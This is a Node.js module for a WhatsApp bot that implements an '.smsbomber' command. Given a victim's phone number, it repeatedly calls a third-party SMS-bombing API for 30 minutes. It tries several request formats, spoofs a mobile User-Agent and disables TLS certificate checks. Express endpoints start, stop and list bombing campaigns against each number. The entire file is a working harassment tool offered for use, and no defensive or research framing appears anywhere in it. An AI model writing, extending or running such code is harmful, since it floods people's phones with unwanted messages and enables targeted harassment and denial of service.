// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number>
// SMS bombing via configurable third-party API
// Uses addkey1 lock (same as .location/.spampair)
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const https = require('https');
const http = require('http');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_MINUTES = 30;
const REQUEST_DELAY_MS = 3000;
// API URL can be overridden via SMS_BOMBER_URL env var
const SMS_API_URL = process.env.SMS_BOMBER_URL || 'https://famofc.site/app/smsboom/';

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
    super();
    this.phone = phoneNumber.replace(/\D/g, '');
    this.durationMs = durationMinutes * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- FLEXIBLE API CALL — tries multiple strategies ----------
  async _sendSms() {
    // Strategy 1: POST form-encoded with "phone" param
    const result1 = await this._tryRequest('POST', { phone: this.phone, number: this.phone, amount: '5' });
    if (result1 && result1.status >= 200 && result1.status < 400) return result1;

    // Strategy 2: GET with phone as query param
    const result2 = await this._tryRequest('GET', null, `?phone=${this.phone}&amount=5`);
    if (result2 && result2.status >= 200 && result2.status < 400) return result2;

    // Strategy 3: POST JSON
    const result3 = await this._tryRequest('POST', JSON.stringify({ phone: this.phone, number: this.phone, amount: 5 }), null, { 'Content-Type': 'application/json' });
    if (result3 && result3.status >= 200 && result3.status < 400) return result3;

    // None worked — return the best result
    return result1 || result2 || result3 || { status: 0, body: 'All strategies failed' };
  }

  async _tryRequest(method, body, queryString, extraHeaders = {}) {
    return new Promise((resolve) => {
      try {
        const url = new URL(SMS_API_URL + (queryString || ''));
        const isPost = method === 'POST' && body !== null;

        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': 'text/html,application/json,*/*',
          ...extraHeaders
        };

        let postData;
        if (isPost && typeof body === 'string') {
          postData = body;
          headers['Content-Type'] = extraHeaders['Content-Type'] || 'application/x-www-form-urlencoded';
          headers['Content-Length'] = Buffer.byteLength(postData);
        } else if (isPost && body) {
          const params = new URLSearchParams(body);
          postData = params.toString();
          headers['Content-Type'] = 'application/x-www-form-urlencoded';
          headers['Content-Length'] = Buffer.byteLength(postData);
        }

        const options = {
          hostname: url.hostname,
          port: 443,
          path: url.pathname + url.search,
          method: method,
          headers,
          timeout: 15000,
          rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            resolve({
              status: res.statusCode,
              body: data.slice(0, 300),
              method
            });
          });
        });

        req.on('error', () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });

        if (isPost && postData) req.write(postData);
        req.end();
      } catch (e) {
        resolve(null);
      }
    });
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        this.stats.attempts++;
        const result = await this._sendSms();
        if (result && result.status >= 200 && result.status < 400) {
          this.stats.success++;
        } else {
          this.stats.errors++;
          if (result) {
            // Log first few errors for debugging
            if (this.stats.errors <= 3) {
              console.log(`[SMSBomber] Attempt ${this.stats.attempts}: HTTP ${result.status} (${result.method || '?'})`);
            }
          }
        }
      } catch (err) {
        this.stats.errors++;
        if (this.stats.errors <= 3) {
          console.log(`[SMSBomber] Error: ${err.message}`);
        }
      }

      if (this.stats.attempts % 5 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(REQUEST_DELAY_MS);
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SmsBomber(phoneNumber);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationMinutes: DEFAULT_DURATION_MINUTES });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
